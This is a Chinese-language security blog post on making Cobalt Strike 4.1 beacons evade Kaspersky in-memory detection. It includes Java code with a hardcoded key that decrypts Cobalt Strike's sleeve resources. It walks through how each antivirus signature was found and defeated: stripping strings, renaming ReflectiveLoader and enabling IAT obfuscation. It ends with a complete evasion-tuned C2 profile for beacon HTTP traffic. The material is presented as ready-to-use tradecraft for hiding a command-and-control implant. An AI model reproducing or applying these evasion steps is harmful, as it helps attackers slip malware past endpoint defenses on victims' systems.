> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9224?page=1)

### 1. 起始

在使用 cobalt strike 的过程中，卡巴斯基对默认 cs 4.1 版本生成的 beacon 进行疯狂的内存查杀，特征多达 6 个。本次采用手动定位法确认特征，并通过修改配置达到内存免杀效果。

### 2. 解密

从 cs4.x 开始，对 beacon 等资源进行了加密，需要解密后才能获得原始 dll，为了更快测试修改后的 dll，对 cs 的加载资源代码进行修改，让其可以直接加载未经加密的 beacon.dll（感谢 WBGII 的解密脚本）  
cs 的资源放在 sleeve 文件夹内, cs 的功能代码为 beacon.dll /beacon.x64.dll，是内存查杀重点关注的对象

```
cs读取资源代码如下
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222101614-f0572f82-74b3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222101614-f0572f82-74b3-1.png)  
对资源进行解密

```
//Author: WBGII
package csdecrypt;
import common.SleevedResource;
import java.io.*;
public class Main {
    public static void saveFile(String filename,byte [] data)throws Exception{
        if(data != null){
            String filepath =filename;
            File file  = new File(filepath);
            if(file.exists()){
                file.delete();
            }
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(data,0,data.length);
            fos.flush();
            fos.close();
        }
    }
    public static byte[] toByteArray(File f) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length());
        BufferedInputStream in = null;
        try {
            in = new BufferedInputStream(new FileInputStream(f));
            int buf_size = 1024;
            byte[] buffer = new byte[buf_size];
            int len = 0;
            while (-1 != (len = in.read(buffer, 0, buf_size))) {
                bos.write(buffer, 0, len);
            }
            return bos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
            throw e;
        } finally {
            try {
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            bos.close();
        }
    }
    public static void main(String[] var0) throws Exception {
        byte[] csdecrypt = new byte[]{1, -55, -61, 127, 102, 0, 0, 0, 100, 1, 0, 27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6};

        SleevedResource.Setup(csdecrypt);
        byte[] var7=null;
        File file = new File("sleeve");     
        File[] fs = file.listFiles();   

        for(File ff:fs){                    
            if(!ff.isDirectory())       
                var7 = SleevedResource.readResource(ff.getPath());
                saveFile("sleevedecrypt\\"+ff.getName(),var7);
                System.out.println("解密成功:"+ff.getName());
        }
    }
}


```

解密后对 cs 的代码进行修改，让其直接可以加载为无加密的资源（资源替换 sleeve 文件夹）

/common/SleevedResource.class

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222101757-2d841b2c-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222101757-2d841b2c-74b4-1.png)

去掉解密过程，让其直接读取字节数组后返回，使用 javac 编译，替换原有的 class

### 3. 测试

将解密后的 beacon.dll 载入内存，使用 KAP 查杀，发现其并无 Cobalt.gen 报毒，但是修补后的 payload 存在报毒，遂怀疑为 cs 生成 payload 的过程中往里面加了东西导致该特征出现。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222101857-5132a6a6-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222101857-5132a6a6-74b4-1.png)  
使用 Beyond Compare 比对原始 dll 和生成后的 payload，发现生成后的 payload 多出很多字符串  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222101938-69be7bb4-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222101938-69be7bb4-74b4-1.png)  
对这些多出的字符串进行删除，发现少了三个报毒，断定其是 Cobalt.gen 报毒的原因，发现默认的 c2 profile 中会添加这些垃圾字符串，并没啥用（坑人），直接删除  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222102032-89eb4bd8-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222102032-89eb4bd8-74b4-1.png)  
删除后，将 payload 载入，发现卡巴不报 Cobalt.gen。前三个特征处理完毕。

### 4. 最后两个

后续两个报毒如下：  
MEM:Trojan.Win32.Cometer.gen  
MEM:Trojan.Win32.SEPEH.gen

使用排列组合对区段进行清除以排查，清除 rdata 和 data 后发现载入内存后不杀。  
发现 rdata 中出现敏感字符串 ReflectiveLoader，遂修改，过了 Cometer.gen

```
transform-x86 {
        strrep "ReflectiveLoader" "misakaloader";
}


```

修改前：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222102247-dac915b2-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222102247-dac915b2-74b4-1.png)  
修改后:  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222102308-e729f9e8-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222102308-e729f9e8-74b4-1.png)  
继续排查，单独提取 rdata 区段载入内存，发现其报毒 SEPEH，就此确认这个查杀点位于此处。使用工具对其他字符清除，发现其继续报毒。为启发式查杀。随后在 rdata 区域发现如下内容  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222102336-f810a964-74b4-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222102336-f810a964-74b4-1.png)  
根据经验猜测修改 Sleep，载入后发现 KAP 不查杀了，看来最后一个特征就是这里了。发现这里是 IAT，准备想办法自行加密 IAT。咨询 WBGII 大佬后，知晓 c2 profile 可以开启加密混淆 IAT，遂使用配置 set obfuscate "true"; 成功 bypass 最后一个报毒。

手动扫描内存  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210222102429-173dcdb2-74b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210222102429-173dcdb2-74b5-1.png)

### 5. 提示

由于分阶段的 payload 存在其他特征，请不要使用。生成 stageless payload 自行接管远程加载  
[https://wbglil.gitbook.io/cobalt-strike/](https://wbglil.gitbook.io/cobalt-strike/)  
再次鸣谢 WBGII 大佬的配置帮助  
最后附上 c2 profile 文件

```
# default sleep time is 60s
set sleeptime "10000";
# jitter factor 0-99% [randomize callback times]
set jitter    "0";
# maximum number of bytes to send in a DNS A record request
set maxdns    "255";
# indicate that this is the default Beacon profile
set sample_name "001";

stage {
    set stomppe "true";
    set obfuscate "true";
    set cleanup "true";
    transform-x86 {
        strrep "ReflectiveLoader" "misakaloader";
    }
    transform-x64 {
        strrep "ReflectiveLoader" "misakaloader";
    }
}
# define indicators for an HTTP GET
http-get {
    # Beacon will randomly choose from this pool of URIs
    set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";
    client {
        # base64 encode session metadata and store it in the Cookie header.
        metadata {
            base64;
            header "Cookie";
        }
    }

    server {
        # server should send output with no changes
        header "Content-Type" "application/octet-stream";

        output {
            print;
        }
    }
}

# define indicators for an HTTP POST
http-post {
    # Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
    set uri "/submit.php";

    client {
        header "Content-Type" "application/octet-stream";

        # transmit our session identifier as /submit.php?id=[identifier]
        id {
            parameter "id";
        }

        # post our output with no real changes
        output {
            print;
        }
    }

    # The server's response to our HTTP POST
    server {
        header "Content-Type" "text/html";

        # this will just print an empty string, meh...
        output {
            print;
        }
    }
}

```